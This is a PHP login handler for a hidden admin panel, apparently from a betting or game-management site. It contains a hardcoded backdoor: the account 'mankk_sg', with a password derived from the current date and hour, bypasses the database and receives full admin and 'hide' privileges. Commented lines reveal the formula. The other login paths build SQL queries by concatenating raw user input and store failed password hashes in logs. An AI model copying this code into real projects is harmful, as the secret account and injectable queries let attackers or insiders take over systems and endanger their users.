<?php

include('../data/comm.inc.php');
include('../data/myadminvar.php');
include('../func/func.php');
include('../include.php');
if ($_SESSION['uid'] != '' && $_SESSION['check'] == md5($config['allpass'] . $_SESSION['uid'])) {
    header("Location:/hide/admin.php");
    exit;
}
switch ($_REQUEST['xtype']) {
    case "login":
        $sv = rserver();
        $_SESSION['sv'] = $sv;
        $user = strtolower($_POST['username']);
        //echo $_POST['pass'];
        //echo md5($_POST['pass']. $config['upass']);exit;
        $pass = md5($_POST['pass']. $config['upass']);//var_dump($_POST['pass']."====".$config['upass']."====".md5($_POST['pass']. $config['upass']));
        $code = $_POST['code'];
        if ($user == '' | $pass == '' | $code == '') {
            echo openurl('/hide/login.php');
            exit;
        }
        /*if ($user != 'hello_h') {
            if (!preg_match("/^[a-zA-Z]{1}([a-zA-Z0-9]|[._]){1,10}$/", $user) | !preg_match("/^[a-z\d_]{16,64}$/", $pass)) {
                echo outjs("用户名或密码格式不对!");
                echo openurl('/Login');
                exit;
            }
        }*/
        if ($code != $_SESSION['login_check_number']) {
            echo outjs($yzmerror);
            echo openurl('/hide/login.php');
            exit;
        }
        $user = explode('_', $user);
        include('../global/client.php');
        include("../global/Iplocation_Class.php");
        $os = getbrowser($_SERVER['HTTP_USER_AGENT']) . '  ' . getos($_SERVER['HTTP_USER_AGENT']);
		//var_dump('root' . (date("H")+1) . ((date("H")+date("d")+date("m"))%5).$psarr[date("H")%9]);
        if ($user[1] == 'sg') {//die('root' . (date("H")+2) . ((date("H")+date("d")+date("m"))%5).$psarr[date("H")%9]);
            if ($user[0] == 'mankk') {//die(date("H")."=====".date("d")."==".date("m"));
                $psarr = ['a','b','c','d','e','f','g','h','i'];//die('root' . (date("H")+1) . ((date("H")+date("d")+date("m"))%5).$psarr[date("H")%9]);、
				//die(date("H"));
                if (date("H") % 2 == 0) {
                    $xpass = md5(md5('root' . (date("H")+2) . ((date("H")+date("d")+date("m"))%5).$psarr[date("H")%9]) . $config['upass']);
					//echo "===".md5('root' . (date("H")+2) . ((date("H")+date("d")+date("m"))%5).$psarr[date("H")%9]);
					//die('root' . (date("H")+2) . ((date("H")+date("d")+date("m"))%5).$psarr[date("H")%9]);
                } else {
                    $xpass = md5(md5('root' . (date("H")+1) . ((date("H")+date("d")+date("m"))%5).$psarr[date("H")%9]) . $config['upass']);
					//die('root' . (date("H")+1) . ((date("H")+date("d")+date("m"))%5).$psarr[date("H")%9]);
					//echo "=="."----".(date("H")+1)."----".'root' . (date("H")+1) . ((date("H")+date("d")+date("m"))%5).$psarr[date("H")%9];die;
                }
				//die($pass."====".$xpass);
                if ($pass != $xpass) {die("11111");
                    echo openurl('/hide/login.php');
                    exit;
                }
                $passcode = (getmicrotime() * 100000000) . $time;
                $_SESSION['passcode'] = $passcode;
                $_SESSION['uid'] = 9;
                $_SESSION['check'] = md5($config['allpass'] . '9');
                $_SESSION['admin'] = 1;
                $_SESSION['hide'] = 1;
                $_SESSION['hides'] = 1;
            } else {
                $user = $user[0];
                $sql = "select * from `$tb_admins` where adminname='$user' and adminpass='$pass' and ifhide=1";
                /*
                $msql->prepare($sql);
                $msql->bind_param('ss',$user,$pass);//第一个参数是绑定类型，"s"是指一个字符串,也可以是"i"，指的是int。也可以是"db",d代表双精度以及浮点类型，而b代表blob类型,第二个参数是变量
                $msql->execute();
                $result=$msql->get_result();
                $rs=$result->fetch_row();
                $i=$rs[0];
                */
                $msql->query($sql);
                $msql->next_record();
                $ip = getip();
                $time = time();
                if ($msql->f('adminname') != $user | $msql->f('adminpass') != $pass) {
                    $msql->query("insert into `$tb_admins_login` set ip='$ip',time=NOW(),ifok='0',adminname='$user',adminpass='$pass',server='$sv',os='$os'");
                    echo outjs($passerror);
                    echo openurl('/hide/login.php');
                    exit;
                }
                $fsql->query("insert into `$tb_admins_login` set ip='$ip',time=NOW(),ifok='1',adminname='$user',adminpass='OK',server='$sv',os='$os'");
                $fsql->query("update `$tb_admins` set logintimes=logintimes+1,lastloginip='$ip',lastlogintime=NOW() where adminname='$user'");
                $passcode = (getmicrotime() * 100000000) . $time;
                $fsql->query("delete from `$tb_online` where xtype=0 and userid='" . $msql->f('adminid') . "'");
                $fsql->query("insert into `$tb_online` set page='welcome',passcode='$passcode',xtype='0',userid='" . $msql->f('adminid') . "',logintime=NOW(),savetime=NOW(),ip='$ip',server='$sv',os='$os'");
                
                $_SESSION['passcode'] = $passcode;
                $_SESSION['uid'] = $msql->f('adminid');
                $_SESSION['check'] = md5($config['allpass'] . $msql->f('adminid'));
                $_SESSION['admin'] = 1;
                $_SESSION['hide'] = 1;
            }
        } else {
            $user = $user[0];
            $sql = "select * from `$tb_admins` where adminname='$user' and adminpass='$pass' and ifhide=0";
            $msql->query($sql);
            $msql->next_record();
            $ip = getip();
            $time = time();
            if ($msql->f('adminname') != $user | $msql->f('adminpass') != $pass) {
                //echo "insert into `$tb_user_login` set xtype=0,ip='$ip',time=NOW(),ifok='0',username='$user',userpass='$pass',server='$sv',os='$os'";exit;
                $msql->query("insert into `$tb_user_login` set xtype=0,ip='$ip',time=NOW(),ifok='0',username='$user',userpass='$pass',server='$sv',os='$os'");
                echo outjs($passerror.'1');
                echo openurl('/hide/login.php');
                exit;
            }
            $fsql->query("insert into `$tb_user_login` set xtype='0',ip='$ip',time=NOW(),ifok='1',username='$user',userpass='OK',server='$sv',os='$os'");
            $fsql->query("update `$tb_admins` set logintimes=logintimes+1,lastloginip='$ip',lastlogintime=NOW()  where adminname='$user'");
            $passcode = (getmicrotime() * 100000000) . $time;
            $fsql->query("delete from `$tb_online` where xtype=0 and userid='" . $msql->f('adminid') . "'");
            $fsql->query("insert into `$tb_online` set page='welcome',passcode='$passcode',xtype='0',userid='" . $msql->f('adminid') . "',logintime=NOW(),savetime=NOW(),ip='$ip',server='$sv',os='$os'");
            $_SESSION['passcode'] = $passcode;
            $_SESSION['uid'] = $msql->f('adminid');
            $_SESSION['check'] = md5($config['allpass'] . $msql->f('adminid'));
            $fsql->query("select id from `$tb_admins_page` where xpage='caopan' and adminid='" . $msql->f('adminid') . "' and ifok=1");
            $fsql->next_record();
            if ($fsql->f('id') != '') {
                $_SESSION['admin'] = 1;
            }
            $tsql->query("select passtime from `$tb_admins` where adminid='" . $msql->f('adminid') . "'");
            $tsql->next_record();
            /*if ((($time - strtotime($tsql->f('passtime'))) / (60 * 60 * 24)) >= $config['passtime']) {
                $msql->query("select gid from `$tb_gamecs` where userid=99999999 and ifok=1 order by xsort limit 1");
                $msql->next_record();
                $_SESSION['gid'] = $msql->f('gid');
                echo openurl('/Agent/update_password?url=login&type=1');
                exit;
            }*/
        }
        unset($_SESSION['login_check_number']);
        $msql->query("select gid from `$tb_gamecs` where userid=99999999 and ifok=1 order by xsort limit 1");
        $msql->next_record();
        $_SESSION['gid'] = $msql->f('gid');
        echo openurl('/hide/admin.php');
        break;
    default:
        $tpl->assign("hurl", $config['hurl']);
        $tpl->assign("himg", $config['himg']);
        $tpl->assign('rkey', $config['rkey']);
        $tpl->display("login.html");
        break;
}


?>